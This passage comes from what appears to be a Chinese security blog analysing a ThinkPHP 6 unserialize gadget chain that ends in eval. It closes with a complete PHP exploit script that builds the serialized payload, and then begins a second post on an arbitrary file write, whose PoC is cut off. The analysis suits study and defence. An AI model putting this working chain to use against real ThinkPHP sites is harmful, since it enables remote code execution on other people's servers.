<span class=\"keyword\">$this</span>-&gt;suffix;</span><br><span class=\"line\">        <span class=\"variable\">$domain</span>  = <span class=\"keyword\">$this</span>-&gt;domain;</span><br><span class=\"line\">        <span class=\"variable\">$request</span> = <span class=\"keyword\">$this</span>-&gt;app-&gt;request;</span><br><span class=\"line\">        <span class=\"variable\">$vars</span>    = <span class=\"keyword\">$this</span>-&gt;vars;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0</span> === strpos(<span class=\"variable\">$url</span>, <span class=\"string\">&#x27;[&#x27;</span>) &amp;&amp; <span class=\"variable\">$pos</span> = strpos(<span class=\"variable\">$url</span>, <span class=\"string\">&#x27;]&#x27;</span>)) &#123;  <span class=\"comment\">//第一个强比较导致退出if</span></span><br><span class=\"line\">            <span class=\"comment\">// [name] 表示使用路由命名标识生成URL</span></span><br><span class=\"line\">            <span class=\"variable\">$name</span> = substr(<span class=\"variable\">$url</span>, <span class=\"number\">1</span>, <span class=\"variable\">$pos</span> - <span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"variable\">$url</span>  = <span class=\"string\">&#x27;name&#x27;</span> . substr(<span class=\"variable\">$url</span>, <span class=\"variable\">$pos</span> + <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"literal\">false</span> === strpos(<span class=\"variable\">$url</span>, <span class=\"string\">&#x27;://&#x27;</span>) &amp;&amp; <span class=\"number\">0</span> !== strpos(<span class=\"variable\">$url</span>, <span class=\"string\">&#x27;/&#x27;</span>)) &#123; <span class=\"comment\">// 进入if</span></span><br><span class=\"line\">            <span class=\"variable\">$info</span> = parse_url(<span class=\"variable\">$url</span>);                                    <span class=\"comment\">//解析$url</span></span><br><span class=\"line\">            <span class=\"variable\">$url</span>  = !<span class=\"keyword\">empty</span>(<span class=\"variable\">$info</span>[<span class=\"string\">&#x27;path&#x27;</span>]) ? <span class=\"variable\">$info</span>[<span class=\"string\">&#x27;path&#x27;</span>] : <span class=\"string\">&#x27;&#x27;</span>;         <span class=\"comment\">//由于不存在[&#x27;path&#x27;] 所以$url = &#x27;&#x27; 为空</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$info</span>[<span class=\"string\">&#x27;fragment&#x27;</span>])) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 解析锚点</span></span><br><span class=\"line\">                <span class=\"variable\">$anchor</span> = <span class=\"variable\">$info</span>[<span class=\"string\">&#x27;fragment&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"literal\">false</span> !== strpos(<span class=\"variable\">$anchor</span>, <span class=\"string\">&#x27;?&#x27;</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 解析参数</span></span><br><span class=\"line\">                    [<span class=\"variable\">$anchor</span>, <span class=\"variable\">$info</span>[<span class=\"string\">&#x27;query&#x27;</span>]] = explode(<span class=\"string\">&#x27;?&#x27;</span>, <span class=\"variable\">$anchor</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"literal\">false</span> !== strpos(<span class=\"variable\">$anchor</span>, <span class=\"string\">&#x27;@&#x27;</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 解析域名</span></span><br><span class=\"line\">                    [<span class=\"variable\">$anchor</span>, <span class=\"variable\">$domain</span>] = explode(<span class=\"string\">&#x27;@&#x27;</span>, <span class=\"variable\">$anchor</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">elseif</span> (strpos(<span class=\"variable\">$url</span>, <span class=\"string\">&#x27;@&#x27;</span>) &amp;&amp; <span class=\"literal\">false</span> === strpos(<span class=\"variable\">$url</span>, <span class=\"string\">&#x27;\\\\&#x27;</span>)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 解析域名</span></span><br><span class=\"line\">                [<span class=\"variable\">$url</span>, <span class=\"variable\">$domain</span>] = explode(<span class=\"string\">&#x27;@&#x27;</span>, <span class=\"variable\">$url</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$url</span>) &#123;</span><br><span class=\"line\">           <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">            * </span></span><br><span class=\"line\"><span class=\"comment\">            */</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable\">$rule</span> = <span class=\"keyword\">$this</span>-&gt;route-&gt;getName(<span class=\"variable\">$checkName</span>, <span class=\"variable\">$checkDomain</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">            * </span></span><br><span class=\"line\"><span class=\"comment\">            */</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$rule</span>) &amp;&amp; <span class=\"variable\">$match</span> = <span class=\"keyword\">$this</span>-&gt;getRuleUrl(<span class=\"variable\">$rule</span>, <span class=\"variable\">$vars</span>, <span class=\"variable\">$domain</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 匹配路由命名标识</span></span><br><span class=\"line\">            <span class=\"variable\">$url</span> = <span class=\"variable\">$match</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$domain</span> &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$match</span>[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$domain</span> = <span class=\"variable\">$match</span>[<span class=\"number\">1</span>];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!is_null(<span class=\"variable\">$match</span>[<span class=\"number\">2</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$suffix</span> = <span class=\"variable\">$match</span>[<span class=\"number\">2</span>];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">elseif</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$rule</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$name</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> \\<span class=\"built_in\">InvalidArgumentException</span>(<span class=\"string\">&#x27;route name not exists:&#x27;</span> . <span class=\"variable\">$name</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 检测URL绑定</span></span><br><span class=\"line\">            <span class=\"variable\">$bind</span> = <span class=\"keyword\">$this</span>-&gt;route-&gt;getDomainBind(<span class=\"variable\">$domain</span> &amp;&amp; is_string(<span class=\"variable\">$domain</span>) ? <span class=\"variable\">$domain</span> : <span class=\"literal\">null</span>);  <span class=\"comment\">//调用点在这里 所以向上需要$url为空</span></span><br><span class=\"line\">            <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">             * </span></span><br><span class=\"line\"><span class=\"comment\">             */</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * </span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>我们先让让 <code>$this-&gt;url</code> 构造成 <code>a:</code> ，此时 $url 的值也就为 <code>&#39;&#39;</code>，后边的各种条件也不会成立，可以直接跳过 。</p>\n<p>这里解释一下为什么<code>$this-&gt;url 需要加 &#39;:&#39;</code></p>\n<p>不加 <code>&#39;:&#39;</code> 时 parse_url 将参数解析为<code>$info[path]</code> 这样一来就不满足 <code>$url</code> 为空的条件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ddcbe2582c96423c8b2fb77e6a869ee0.png\"></p>\n<p>进入<code>if($url)</code> 这里因为 <code>$url = &#39;&#39;</code> 所以跳过进入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$rule</span>) &amp;&amp; <span class=\"variable\">$match</span> = <span class=\"keyword\">$this</span>-&gt;getRuleUrl(<span class=\"variable\">$rule</span>, <span class=\"variable\">$vars</span>, <span class=\"variable\">$domain</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">elseif</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$rule</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$name</span>))</span><br></pre></td></tr></table></figure>\n<p>但是因为<code>$rule</code>是在if($url)进行赋值，所以条件不成路 直接跳过进入else分支</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$bind</span> = <span class=\"keyword\">$this</span>-&gt;route-&gt;getDomainBind(<span class=\"variable\">$domain</span> &amp;&amp; is_string(<span class=\"variable\">$domain</span>) ? <span class=\"variable\">$domain</span> : <span class=\"literal\">null</span>);</span><br></pre></td></tr></table></figure>\n<p>仔细看这行代码 <code>$this-&gt;route</code> 可控 <code>$domain</code> 由 <code>$this-&gt;domain</code> 也是可控</p>\n<p>那么就得到 <strong>[可控类] -&gt; getDomainBind([可控字符串])</strong> 的调用形式，所以可以调用 <code>__call</code> 方法</p>\n<p>综上 目前需要的条件是：</p>\n<ul>\n<li>$this-&gt;url = ‘a:’</li>\n<li>$this-&gt;app = 给个public的request属性的任意类</li>\n</ul>\n<p>这里 <code>$this-&gt;app</code> 通过看师傅的exp <code>new了一个Url</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7a0e8e2168684830a86870c7f411547e.png\"></p>\n<p>因为后续跳板是<code>Validate</code> ，看Url类的 __construct()方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f0709fa4d1a54af6813e732c149b0c78.png\"></p>\n<p>build()方法中也要求有request属性</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b6534cc6cd5d41a7a2c92958d91d3db0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_15,color_FFFFFF,t_70,g_se,x_16\"></p>\n<p>所以这里的 app给一个request即可</p>\n<p>接着往下</p>\n<p>然后全局搜索 <code>__call</code> 魔法方法，在 <code>Validate</code> 类 <code>(vendor/topthink/framework/src/think/Validate.php)</code> 中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$method</span>, <span class=\"variable\">$args</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">&#x27;is&#x27;</span> == strtolower(substr(<span class=\"variable\">$method</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>))) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$method</span> = substr(<span class=\"variable\">$method</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        array_push(<span class=\"variable\">$args</span>, lcfirst(<span class=\"variable\">$method</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> call_user_func_array([<span class=\"keyword\">$this</span>, <span class=\"string\">&#x27;is&#x27;</span>], <span class=\"variable\">$args</span>);  <span class=\"comment\">// 相当于 $this-&gt;is([$domain,&#x27;getDomainBind&#x27;]) </span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的 <code>call_user_func_array($this-&gt;is([$domain,&#39;getDomainBind&#39;]))</code> ，其中 $domain 是可控的</p>\n<p>跟进 <code>is</code> 方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">public function is($value, string $rule, array $data = []): bool  // $value = $domain  $rule = getDomainBind</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (Str::camel(<span class=\"variable\">$rule</span>)) &#123;     <span class=\"comment\">//进入camel  $rule 返回值为 getDomainBind</span></span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;require&#x27;</span>:</span><br><span class=\"line\">               <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">                * </span></span><br><span class=\"line\"><span class=\"comment\">                */</span></span><br><span class=\"line\">            <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;type[<span class=\"variable\">$rule</span>])) &#123;     <span class=\"comment\">//进入default分支</span></span><br><span class=\"line\">                    <span class=\"comment\">// 注册的验证规则</span></span><br><span class=\"line\">                    <span class=\"variable\">$result</span> = call_user_func_array(<span class=\"keyword\">$this</span>-&gt;type[<span class=\"variable\">$rule</span>], [<span class=\"variable\">$value</span>]);  <span class=\"comment\">//call_user_func_array($this-&gt;type[&#x27;getDomainBind&#x27;], [$value])</span></span><br><span class=\"line\">                &#125; </span><br><span class=\"line\">                <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">                 * </span></span><br><span class=\"line\"><span class=\"comment\">                 */</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$result</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><code>$value 即为 $domain</code> ，<code>$rule 变量的值即为 getDomainBind</code> </p>\n<p>接着进行 <code>Str::camel($rule)</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// class Str&#123;&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">studly</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$value</span></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"built_in\">static</span>::<span class=\"variable\">$studlyCache</span>[<span class=\"variable\">$key</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">static</span>::<span class=\"variable\">$studlyCache</span>[<span class=\"variable\">$key</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$value</span> = ucwords(str_replace([<span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;_&#x27;</span>], <span class=\"string\">&#x27; &#x27;</span>, <span class=\"variable\">$value</span>));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">static</span>::<span class=\"variable\">$studlyCache</span>[<span class=\"variable\">$key</span>] = str_replace(<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$value</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">camel</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$value</span></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"built_in\">static</span>::<span class=\"variable\">$camelCache</span>[<span class=\"variable\">$value</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">static</span>::<span class=\"variable\">$camelCache</span>[<span class=\"variable\">$value</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">static</span>::<span class=\"variable\">$camelCache</span>[<span class=\"variable\">$value</span>] = lcfirst(<span class=\"built_in\">static</span>::studly(<span class=\"variable\">$value</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>返回值为 <code>getDomainBind </code></p>\n<p>具体分析：</p>\n<p>跟进 $this-&gt;is 方法， $rule 变量的值即为 getDomainBind， <code>Str::camel($rule)</code> 的意思实际上是将 $rule = ‘getDomainBind’ 的 <strong>- 和 _ 替换成 ‘’</strong> ， 并将每个单词首字母大写存入 <code>static::$studlyCache[&#39;getDomainBind&#39;]</code> 中，然后回头先将首字母小写后赋值给 camel 方法的 <code>static::$cameCache[&#39;getDomainBind&#39;]</code> ，即返回值为 getDomainBind 。</p>\n<p>此时进入default分支 进入第一个if语句，这样就得到了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$result</span> = call_user_func_array(<span class=\"keyword\">$this</span>-&gt;type[<span class=\"variable\">$rule</span>], [<span class=\"variable\">$value</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">即：call_user_func_array(<span class=\"keyword\">$this</span>-&gt;type[<span class=\"string\">&#x27;getDomainBind&#x27;</span>], [<span class=\"variable\">$value</span>])</span><br></pre></td></tr></table></figure>\n\n<p>二者都可控<br><code>$this-&gt;type[$rule]是函数名</code>，<code>$value是函数的参数</code></p>\n<p>所以我们可以<code>传入单个参数的函数调用</code></p>\n<p>我们来到 Php 类 <code>(vendor/topthink/framework/src/think/view/driver/Php.php)</code>中，这里存在一个<code>调用 eval 的且可传 单参数</code> 的方法 <code>display</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">display</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$content</span>, <span class=\"keyword\">array</span> <span class=\"variable\">$data</span> = []</span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;content = <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    extract(<span class=\"variable\">$data</span>, EXTR_OVERWRITE);</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;?&gt;&#x27;</span> . <span class=\"keyword\">$this</span>-&gt;content);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据上边的 <strong>call_user_func_array([可控变量],[[可控变量]])</strong> 形式，构造出 <code>call_user_func_array([&#39;Php类&#39;,&#39;display&#39;],[&#39;&lt;?php (任意代码) ?&gt;&#39;])</code> 即可执行 eval 了。</p>\n<ul>\n<li>即$this-&gt;type = [“getDomainBind” =&gt; [php类,”display”]]</li>\n</ul>\n<p>由于入口处Model是一个抽象类，所以要从继承Model的类来进行实现</p>\n<p>这里从<code>Pivot</code> 类 <code>(vendor/topthink/tink-orm/src/model/Pivot.php)</code></p>\n<p>至此分析结束</p>\n<h1 id=\"大概流程\"><a href=\"#大概流程\" class=\"headerlink\" title=\"大概流程\"></a>大概流程</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/76ed751e765e48b1990cd21ac1fc907c.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7f3546116d3642cea03f2fb68772f970.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/0829feba84b84742b9fca804527fa267.png\"></p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">concern</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">trait</span> <span class=\"title\">Attribute</span>&#123;</span><br><span class=\"line\">        <span class=\"title\">private</span> $<span class=\"title\">data</span> = [7];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">view</span>\\<span class=\"title\">driver</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">class</span> <span class=\"title\">Php</span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title\">namespace</span> <span class=\"title\">think</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">abstract</span> <span class=\"title\">class</span> <span class=\"title\">Model</span>&#123;</span><br><span class=\"line\">        <span class=\"title\">use</span> <span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">Attribute</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$lazySave</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$withEvent</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$table</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$cmd</span></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;lazySave = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;withEvent = <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;table = <span class=\"keyword\">new</span> route\\Url(<span class=\"keyword\">new</span> Middleware,<span class=\"keyword\">new</span> Validate,<span class=\"variable\">$cmd</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Middleware</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$request</span> = <span class=\"number\">2333</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Validate</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$type</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">             <span class=\"keyword\">$this</span>-&gt;type = [</span><br><span class=\"line\">                <span class=\"string\">&quot;getDomainBind&quot;</span> =&gt; [<span class=\"keyword\">new</span> view\\driver\\Php,<span class=\"string\">&#x27;display&#x27;</span>]</span><br><span class=\"line\">            ];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;&#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">route</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">class</span> <span class=\"title\">Url</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        protected $url = &#x27;a:&#x27;;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$domain</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$app</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$route</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$app</span>,<span class=\"variable\">$route</span>,<span class=\"variable\">$cmd</span></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;domain = <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;app = <span class=\"variable\">$app</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;route = <span class=\"variable\">$route</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    echo urlencode(serialize(new think\\Model\\Pivot(&#x27;&lt;?php phpinfo(); exit(); ?&gt;&#x27;)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP v6.0.9 反序列化&任意写文件 分析","url":"/2023/12/25/ThinkPHP%20v6.0.9%20save()%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>从Y4tacker师傅直播中了解，自己跟一下</p>\n<h1 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h1><p><a href=\"https://blog.csdn.net/Quest_sec/article/details/105340807\">用phpstudy部署thinkphp6 / 使用教程</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ec97455b5ec044d89012e825d2297e81.png\"></p>\n<p>使用composer安装tp6 php版本在7.1以上</p>\n<a id=\"more\"></a>\n<p>写入demo:</p>\n<p>D:\\phpstudy_pro\\WWW\\tp\\app\\controller\\Index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">app</span>\\<span class=\"title\">controller</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">app</span>\\<span class=\"title\">BaseController</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Index</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseController</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"><span class=\"variable\">$unser</span> = <span class=\"string\">&quot;&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">\t\tunserialize(<span class=\"variable\">$unser</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h1><p>poc:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">League</span>\\<span class=\"title\">Flysystem</span>\\<span class=\"title\">Cached</span>\\<span class=\"title\">Storage</span>&#123;</span><br><span class=\"line\">\t<span class=\"title\">use</span> <span class=\"title\">League</span>\\<span class=\"title\">Flysystem</span>\\<span class=\"title\">Filesystem</span>\\<span class=\"title\">AbstractAdapter</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AbstractCache</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">protected</span> <span class=\"variable\">$autosave</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Adapter</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractCache</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">protected</span> <span class=\"variable\">$adapter</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">protected</span> <span class=\"variable\">$file</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">protected</span> <span class=\"variable\">$expire</span>;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span 